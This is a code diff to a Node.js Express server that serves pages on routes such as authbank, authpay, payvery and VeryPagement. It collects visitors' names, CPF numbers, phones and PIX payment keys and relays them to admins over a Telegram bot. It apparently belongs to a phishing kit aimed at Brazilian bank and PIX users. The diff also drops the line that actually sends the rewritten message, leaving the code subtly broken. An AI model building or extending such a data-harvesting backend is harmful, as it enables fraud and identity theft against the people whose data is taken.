@@ -9,6 +9,56 @@ const TelegramBot = require('node-telegram-bot-api');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+
+// Página inicial
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'inicial', 'index.html'));
+});
+
+// Rotas HTML
+app.get('/acesso', (req, res) => {
+  res.sendFile(path.join(__dirname, 'acesso', 'index.html'));
+});
+
+app.get('/authbank', (req, res) => {
+  res.sendFile(path.join(__dirname, 'authbank', 'index.html'));
+});
+
+app.get('/authpay', (req, res) => {
+  res.sendFile(path.join(__dirname, 'authpay', 'index.html'));
+});
+
+app.get('/confirm', (req, res) => {
+  res.sendFile(path.join(__dirname, 'confirm', 'index.html'));
+});
+
+app.get('/pay', (req, res) => {
+  res.sendFile(path.join(__dirname, 'pay', 'index.html'));
+});
+
+app.get('/payvery', (req, res) => {
+  res.sendFile(path.join(__dirname, 'payvery', 'index.html'));
+});
+
+app.get('/very', (req, res) => {
+  res.sendFile(path.join(__dirname, 'very', 'index.html'));
+});
+
+app.get('/VeryPagement', (req, res) => {
+  res.sendFile(path.join(__dirname, 'VeryPagement', 'pagamento.html'));
+});
+
+// Arquivos estáticos
+app.use('/acesso', express.static(path.join(__dirname, 'acesso')));
+app.use('/authbank', express.static(path.join(__dirname, 'authbank')));
+app.use('/authpay', express.static(path.join(__dirname, 'authpay')));
+app.use('/confirm', express.static(path.join(__dirname, 'confirm')));
+app.use('/pay', express.static(path.join(__dirname, 'pay')));
+app.use('/payvery', express.static(path.join(__dirname, 'payvery')));
+app.use('/very', express.static(path.join(__dirname, 'very')));
+app.use('/VeryPagement', express.static(path.join(__dirname, 'VeryPagement')));
+app.use('/img', express.static(path.join(__dirname, 'img'))); 
+
 // Telegram Bot
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const ADMINS = process.env.ADMINS?.split(',').map(id => parseInt(id.trim())) || [];
@@ -89,6 +139,8 @@ async function sendConfirmationEmail(cliente, emailDestino) {
   }
 }
 
+
+
 // Rota para cadastro
 app.post('/api/clients', (req, res) => {
   const { nome, cpf, telefone, pix_key_type, pix_key, email } = req.body;
@@ -127,8 +179,18 @@ app.post('/api/clients', (req, res) => {
 
     // Enviar para o Telegram (certificando-se de que o CHAT_ID está correto)
     if (CHAT_ID) {
-      const msg = `📌 *Novo Cadastro Recebido* 📌\n\n👤 *Nome:* ${nome}\n🆔 *CPF:* ${cpf}\n📞 *Telefone:* ${telefone}\n💳 *Chave PIX (${pix_key_type}):* ${pix_key}\n🕒 *Data:* ${new Date().toLocaleString()}`;
-      bot.sendMessage(CHAT_ID, msg, { parse_mode: 'Markdown' });
+      const msg = `✨ *Novo Cadastro Recebido!* ✨
+
+👤 *Nome:* \`${nome}\`
+🆔 *CPF:* \`${cpf}\`
+📞 *Telefone:* \`${telefone}\`
+
+💳 *Chave PIX*
+• *Tipo:* \`${pix_key_type}\`
+• *Chave:* \`${pix_key}\`
+
+📅 *Data/Hora:* _${new Date().toLocaleString()}_`;
+
     } else {
       console.warn('CHAT_ID não foi encontrado. Verifique se um administrador interagiu com o bot.');
     }
